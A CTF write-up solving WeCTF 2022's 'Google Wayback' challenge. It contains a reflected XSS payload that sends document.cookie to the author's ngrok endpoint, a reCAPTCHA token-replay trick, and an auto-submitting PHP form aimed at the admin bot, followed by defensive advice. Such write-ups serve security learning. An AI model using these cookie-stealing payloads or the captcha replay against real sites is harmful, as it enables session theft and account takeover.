# WeCTF 2022 write-up - Google Wayback

![](https://i.imgur.com/I9v9UcT.png)

This is the 3rd edition of WeCTF and this is the only CTF I'm following since the begining - because I started playing in 2020 - and it's one of my favorites, since I'm a big Web Hacking fan :)

## The Challenge

![](https://i.imgur.com/EGB137G.png)

```
Google Wayback
A copycat site of Google in 2001.

Hint: Do you know Google used to have XSS?
Submit Your Hacking Site here: https://report_url

Source Code: https://storage.googleapis.com/wectf22/google.zip
```

In this challenge we have a simple php page simulating an old version of the Google Search page.

It's a [XSS](https://portswigger.net/web-security/cross-site-scripting) challenge. In those kind of challenges, there is an admin bot, which usually have cookies or Local Storage in the domain of the challenge app.
The mission is to trigger a XSS in the app, so we can hijack this "protected" information.

Code is really simple, with only two php pages:
1. `index.php`: The entry page with initial seach form (image above) 
2. `search.php`: The seach page, to which we post the seach query (image below).

![](https://i.imgur.com/zcd0Od8.png)

To solve the challenge, we need to send an URL to the admin bot, that triggers the XSS.

## XSS

Since the challenge points directly to an XSS, we must first find it, aaaaand it's a quite basic flaw, in the `search.php` page:

```php
<input class="lst" value="<?php echo $_GET["q"]; ?>" />
```
(Note that i'm ignoring most of the attributes of the input)

This is XSS 101. We don't have any XSS protection here, like CSP, sanitizers... Let's just test it.

Let's put a fetch into play and test it.
That's the payload we want to run in the admin (bot) browser:

```html
<script>
    flag = encodeURIComponent(document.cookie);
    fetch("http://myngrok.ngrok.io/flag?="+flag, {
        "mode": "no-cors"
    });
</script>
```

**Summary**
- Get the `document.cookie` info where the flag probably is.
- Send the captured flag to a server in our control - in this case, our [ngrok](https://ngrok.com/) endpoint.
- The `no-cors` option means we can send the value but we won't get the answer, ignoring the CORS policy of the fetch site (in this case, my ngrok endpoint).
    - It is enough, since we only care for the requesting getting there.


We just need to put the (minified) payload below in the search bar.

```
A"><script>fetch("http://myngrok.ngrok.io/flag?="%2BencodeURIComponent(document.cookie), {"mode": "no-cors"});</script><input class="lst" value="B
```

(The `%2B` here is to avoid the `+` to be interpreted as a space in the query string).

And our ngrok gives:

```
GET /flag?=__gsas%3DID%3D<SOME_COOKIE_INFO> HTTP/1.1
Host: myngrok.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en
Referer: http://google.us.ctf.so/
X-Forwarded-For: <SOME_IP>
X-Forwarded-Proto: http
```

Since the search page only accepts POSTs, we just need to create a poisoned form and auto-submit it with our payload.

Easy right? Not that much.

It turns out, the real challenge here is to bypass the captcha, not the XSS.

## Captcha

Wait! What?!? Captcha Bypass??? [reCaptcha](https://www.google.com/recaptcha/about/)????

That was my first thought here, and I had to take some time to abstract the real problem here: we don't have to find a flaw in the reCaptcha software to bypass it any case. We just have to bypass ONE SPECIFIC captcha run in a restricted scenario.

### Testing

It was a little tricky at first to test it.

![](https://i.imgur.com/cfZzaV8.png)

[`"Localhost is not in the list of supported domains for this site key."`](https://developers.google.com/recaptcha/docs/faq#localhost_support)

I thought I would need to setup some temporary domain and recaptcha account for me to test it.. too much dramatic.

Changing my `/etc/hosts` to include the challenge domain to 127.0.0.1 was just enough.

`127.0.0.1 google.us.ctf.so`

Being http (without the secure part), we're back on the game.

### Understanding

To understand what is happening here, let's check what's going on the post when we search for string "`Some test`".

![](https://i.imgur.com/5S5Zgj6.png)

There's a `g-recaptcha-response` with a huge value, obviously generated after choosing the correct images with traffic lights or boats :)

And it handles the captcha response in the beginning of the `search.php`.

```php
if ($_SERVER['REQUEST_METHOD'] !== "POST") {
    die("no recaptcha");
}

if(!isset($_POST['g-recaptcha-response'])){
    die("no recaptcha");
}
    
$captcha=$_POST['g-recaptcha-response'];

$secretKey = "[REPLACE ME]";
$url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) .  '&response=' . urlencode($captcha);
$response = file_get_contents($url);
$responseKeys = json_decode($response,true);
if(!$responseKeys["success"]) {
    die("wrong recaptcha");
}
// ...
```

**Summary**
- Allow only POSTs
- Must have `g-recaptcha-response` in the body
- Use some secret-key (that we don't have) to verify if the response is correct in the captcha API.

Since the domain is "correct", we're able to generate the correct response, but we can't validate it in our local server, because we don't have the correct secret key.

Problem? No.

![](https://i.imgur.com/AMdpIhZ.png)


## Bypass everything

We don't really need to validate it locally.
we just need to send the correct captcha to the admin bot.

### Poisoned Form

Since the page only accepts POSTs, we need to craft a poisoned form, that automatically triggers a POST to the search page:

```html
<html>
    <form action="http://google.us.ctf.so/search.php?q=my-search-text" method="POST" name="f" id="search">
        <input type="text" name="q" dir="ltr" value="my-search-text"/>
        <input type="hidden" name="g-recaptcha-response" value="CORRECT-g-recaptcha-response-HERE"/>
        <input type="hidden" name="btnG" value="Google Search"/>
    </form>

    <script>
        frm = document.getElementById("search");
        frm.submit();
    </script>
</html>
```

**Summary**
- This is a form simulating all the values used in the `search.php` page.
- The query (`q`) value is in the querystring and as a form value.
- There is a placeholder for the correct recaptcha response (we'll get there).
- There is a javascript submitting the form automatically.

When the Admin Bot loads this form, it calls the search.php automatically... but we did not solve the captcha yet.

### Captcha Bypass

After solving the captcha in our attacker browser, the response is valid for the correct domain for 2 minutes.

This is time enough for sending the poisoned form to the bot with the correct value!

To avoid changing a lot of things manually, I changed my local page to save the g-captcha-response in the server.

```php
if ($_SERVER['REQUEST_METHOD'] !== "POST") {
    die("no recaptcha");
}

if(!isset($_POST['g-recaptcha-response'])){
    die("no recaptcha");
}
    
$captcha=$_POST['g-recaptcha-response'];

file_put_contents('g-recaptcha-response', $captcha);

die($captcha);
```

Then I send a page (`payload.php`) to the Admin Bot that loads the saved g-captcha-response and puts it in the correct form input.

```php
<?php

$captcha = file_get_contents('g-recaptcha-response');

while ($captcha == false) {
    sleep(2);
    $captcha = file_get_contents('g-recaptcha-response');
}

?>

<html>
    <form action="http://google.us.ctf.so/search.php?q=my-search-text" method="POST" name="f" id="search">
        <input type="text" name="q" dir="ltr" value="my-search-text"/>
        <input type="hidden" name="g-recaptcha-response" value="<?php echo $captcha; ?>"/>
        <input type="hidden" name="btnG" value="Google Search"/>
    </form>

    <script>
        frm = document.getElementById("search");
        frm.submit();
    </script>
</html>
```

Note that the loop in the beginning is just to avoid errors if the captcha is not ready when the payload is called.

### XSS Fatality

Since we bypassed the captcha protection, let's move to include our XSS Payload in the query string. The content of the form input is not used, so it can be anything.

Now we have our complete `payload.php`, inside the rebuilt docker image from the challenge (prove your own poison, shou!).

```php
<?php

$payload = urlencode('A"><script>fetch("http://my-ngrok-url.ngrok.io/flag?="+encodeURIComponent(document.cookie), {"mode": "no-cors"});</script><input class="lst" value="B');

$captcha = file_get_contents('g-recaptcha-response');

while ($captcha == false) {
    sleep(2);
    $captcha = file_get_contents('g-recaptcha-response');
}

?>

<html>
    <form action="http://google.us.ctf.so/search.php?q=<?php echo $payload; ?>" method="POST" name="f" id="search">
        <input type="text" name="q" dir="ltr" value="something"/>
        <input type="hidden" name="g-recaptcha-response" value="<?php echo $captcha; ?>"/>
        <input type="hidden" name="btnG" value="Google Search"/>
    </form>

    <script>
        frm = document.getElementById("search");
        frm.submit();
    </script>
</html>
```

## Exploiting

Let's guarantee we're not a bot to our local instance and click on `Google Seach` to POST and save the captcha response.

![](https://i.imgur.com/liioQFa.png)

Then send our payload with the poisoned form to the Admin Bot.

![](https://i.imgur.com/qZT8o8R.png)

The following complete payload is generated to the Admin Bot by the `payload.php`.

```html
<html>
    <form action="http://google.us.ctf.so/search.php?q=A%22%3E%3Cscript%3Efetch%28%22http%3A%2F%2Fmy-ngrok-url.ngrok.io%2Fflag%3F%3D%22%2BencodeURIComponent%28document.cookie%29%2C+%7B%22mode%22%3A+%22no-cors%22%7D%29%3B%3C%2Fscript%3E%3Cinput+class%3D%22lst%22+value%3D%22B" method="POST" name="f" id="search">
        <input type="text" name="q" dir="ltr" value="something"/>
        <input type="hidden" name="g-recaptcha-response" value="03AGdBq25Rrd4D_AlggGkAW6sNiyTnrkygst42GVEe1j0_aayeH1aoP3euNvk8D76jvX22xjf9nYqnG7UwhHLMW78DTeJ0xIVWpMfztadjH_GBdsPl1CAJnkU0AEbIqDb8KsdyHb1Zin5YdOHbb7qFkkZ8HY7x0mePrbeiQmpOgZ_V63sAuXA7c51FZaVUR6_MQCSSKNInojJSDDygQ_aWIKleEh8Hyx_qzM_YQlwlMEFaojizSqRSFE_dz7O8-PLwUQ7tUiL_2X--NRymsIDVUq_fCM0o6nISmbFs7izgZrS3bIfTVmRsGuQVLdag_2aC_Nv0UF7vI0_ZMKievujJRwvWyonjQWtZHrJesqZMONOZZX9Yb_ZBPnpWvgcC7ILwz1pIRrIhcBQCNHYpjKtfnsUVQpuAujiOMktaGPj48dnY79aQw3Eq6FcT1g09L5XAmaUTRlFTQL4pq51p4C6wl2I9YF_f74FHMY3-v7RaEGtB2ts58NzBZJJ4HJHpyhLrALx3HB_7uddJaJivkMRXaq-LeHlTLBGyrQ"/>
        <input type="hidden" name="btnG" value="Google Search"/>
    </form>

    <script>
        frm = document.getElementById("search");
        frm.submit();
    </script>
</html>
```

Now, relax and wait for our XSS to explode in the Admin Bot and steal his cookies.

![](https://i.imgur.com/DRdO4Vx.png)

**Flag**
```
we{50f71c88-955f-48e0-bb57-6fb070a29bdb@y0U_Ha(K3d_g0Ogl3}
```

## Lessons Learned

Bypassing the captcha looked impossible to me at first, but the challenge showed me that bypassing specific scenarios may be enough for specific wins.
I had a lot of fun with it.

## Preventing

To avoid being hacked by this kind of attack, I would suggest some protections for the Google Search Team:

- Always use HTTPS and set your cookies [Secure](https://owasp.org/www-community/controls/SecureCookieAttribute).
- Always use [CRSF tokens](https://portswigger.net/web-security/csrf/tokens)
    - Avoid those poisoned forms.
- Using [httpOnly](https://owasp.org/www-community/HttpOnly) cookies, whenever possible.
    - Avoid cookie stealing using `document.cookie`.
- [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) would also probably help.
- Sanitize your input
    - Protect from XSS.
    - Don't trust shou.

I'm sure I'm forgetting other important protections here. Send me hints for improving security on [Twitter](https://twitter.com/NeptunianHacks).

## References
* [CTF Time Event](https://ctftime.org/event/1546)
* [Official Source](https://github.com/wectf/2022/tree/master/google) of the challenge released by the organizers.
* [Github repo with the artifacts discussed here](https://github.com/Neptunians/wectf-2022-google-wayback)
* [XSS](https://portswigger.net/web-security/cross-site-scripting)
* [ngrok](https://ngrok.com/)
* [reCaptcha](https://www.google.com/recaptcha/about/)
* [Secure Cookies](https://owasp.org/www-community/controls/SecureCookieAttribute)
* [CRSF tokens](https://portswigger.net/web-security/csrf/tokens)
* [httpOnly](https://owasp.org/www-community/HttpOnly)
* [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) 
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 